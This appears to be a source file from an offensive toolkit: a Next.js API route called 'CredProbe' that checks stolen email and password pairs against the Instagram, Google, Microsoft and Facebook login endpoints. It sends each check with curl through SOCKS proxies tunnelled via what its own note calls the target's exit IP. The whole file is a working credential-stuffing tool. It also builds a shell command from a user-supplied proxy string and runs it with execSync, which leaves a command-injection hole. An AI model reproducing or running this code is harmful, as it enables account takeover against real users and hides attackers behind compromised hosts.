
import { NextRequest, NextResponse } from 'next/server'
import { readFile, writeFile, mkdir } from 'fs/promises'
import { join } from 'path'
import { spawn } from 'child_process'
import net from 'net'

const PROXY_DB = '/tmp/hermes-proxies.json'

interface ValidateRequest {
  email: string
  password: string
  service?: string   // 'instagram', 'google', 'microsoft', 'facebook', 'generic'
  proxyUrl?: string  // optional — use best available if not specified
}

interface ProxyEntry {
  id: string
  url: string
  tunnelId: string
  technique: string
  sni: string
  useTLS: boolean
  healthy: boolean
  latencyMs: number | null
}

async function getProxies(): Promise<ProxyEntry[]> {
  try {
    const data = await readFile(PROXY_DB, 'utf-8')
    return JSON.parse(data)
  } catch { return [] }
}

async function findBestProxy(): Promise<ProxyEntry | null> {
  const proxies = await getProxies()
  const healthy = proxies.filter(p => p.healthy)
  if (healthy.length === 0) return null
  // Prefer lower latency, then TLS+SNI
  healthy.sort((a, b) => {
    const aTLS = a.useTLS ? 1 : 0
    const bTLS = b.useTLS ? 1 : 0
    if (bTLS !== aTLS) return bTLS - aTLS
    return (a.latencyMs || 999) - (b.latencyMs || 999)
  })
  return healthy[0]
}

async function testProxyConnectivity(proxyUrl: string): Promise<boolean> {
  return new Promise(resolve => {
    const url = new URL(proxyUrl)
    const socket = new net.Socket()
    socket.setTimeout(3000)
    socket.on('connect', () => { socket.destroy(); resolve(true) })
    socket.on('error', () => resolve(false))
    socket.on('timeout', () => { socket.destroy(); resolve(false) })
    socket.connect(parseInt(url.port || '1080'), url.hostname)
  })
}

// GET /api/credprobe/proxy-url — best available proxy
export async function GET(request: NextRequest) {
  const proxy = await findBestProxy()
  if (!proxy) {
    return NextResponse.json({ error: 'No healthy proxies', available: false })
  }
  const alive = await testProxyConnectivity(proxy.url)
  return NextResponse.json({
    proxy: proxy.url,
    available: alive,
    tunnelId: proxy.tunnelId,
    technique: proxy.technique,
    sni: proxy.sni,
    tls: proxy.useTLS,
    latencia: proxy.latencyMs,
  })
}

// POST /api/credprobe/validate — validate credentials through tunnel proxy
export async function POST(request: NextRequest) {
  try {
    const body: ValidateRequest = await request.json()
    const { email, password, service, proxyUrl } = body

    // Find proxy
    let proxy = proxyUrl
    if (!proxy) {
      const best = await findBestProxy()
      if (!best) return NextResponse.json({ error: 'No hay proxies disponibles. Arranca un túnel primero.' }, { status: 503 })
      proxy = best.url
    }

    // Determine service endpoints
    const serviceEndpoints: Record<string, { url: string; method: string; successPattern: string }> = {
      instagram: {
        url: 'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
        method: 'POST',
        successPattern: '"authenticated":true',
      },
      google: {
        url: 'https://accounts.google.com/signin/v1/lookup',
        method: 'POST',
        successPattern: '',
      },
      microsoft: {
        url: 'https://login.live.com/oauth20_authorize.srf',
        method: 'GET',
        successPattern: '',
      },
      facebook: {
        url: 'https://www.facebook.com/api/graphql/',
        method: 'POST',
        successPattern: '',
      },
    }

    const svc = serviceEndpoints[service || 'generic'] || { url: '', method: 'GET', successPattern: '' }

    // Use curl through the SOCKS proxy
    const curlArgs = [
      'curl', '-s', '--max-time', '15',
      '--socks5', proxy.replace('socks5://', ''),
      '-o', '/dev/null', '-w', '%{http_code} %{url_effective} %{time_total}',
    ]

    if (svc.url) {
      curlArgs.push(svc.url)
      if (svc.method === 'POST') {
        curlArgs.push('-X', 'POST', '-d', `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`)
      }
    } else {
      // Generic: try a simple connection test through proxy
      curlArgs.push('https://httpbin.org/ip')
    }

    const { execSync } = require('child_process')
    let result = ''
    let error = ''
    try {
      result = execSync(curlArgs.join(' '), { timeout: 20000, encoding: 'utf-8' }).trim()
    } catch (e: any) {
      error = e.message
      result = e.stdout || ''
    }

    return NextResponse.json({
      proxy: proxy,
      service: service || 'generic',
      result: result,
      error: error || null,
      timestamp: new Date().toISOString(),
      note: 'CredProbe via tunnel SOCKS — la IP de salida es la del objetivo',
    })
  } catch (error: any) {
    return NextResponse.json({ error: `Validation failed: ${error.message}` }, { status: 500 })
  }
}
